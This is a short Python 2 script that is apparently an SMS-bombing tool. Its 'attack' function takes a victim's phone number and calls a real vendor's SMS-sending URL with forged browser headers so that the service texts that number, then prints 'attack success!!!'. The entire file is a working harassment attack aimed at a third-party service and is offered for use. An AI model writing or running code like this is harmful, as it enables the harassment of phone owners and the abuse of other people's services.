# -*- coding: utf-8 -*-

import httplib,urllib,sys,os,re,urllib2
import string

def attack(phone):
    datas=""
    url='http://www.oupeng.com/sms/sendsms.php?os=s60&mobile=%s' % phone
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",
                  "Accept": "text/plain",'Referer':'http://www.oupeng.com/download'}
    #payload=urllib.urlencode(payload)

    try:
        request=urllib2.Request(url=url,headers=i_headers)
        response=urllib2.urlopen(request)
        datas=response.read()
        print datas
        print 'attack success!!!'
    except Exception, e:
        print e
        print "attack failed!!!"

if __name__=="__main__":
    phone=raw_input('input the phone:')
    attack(phone)
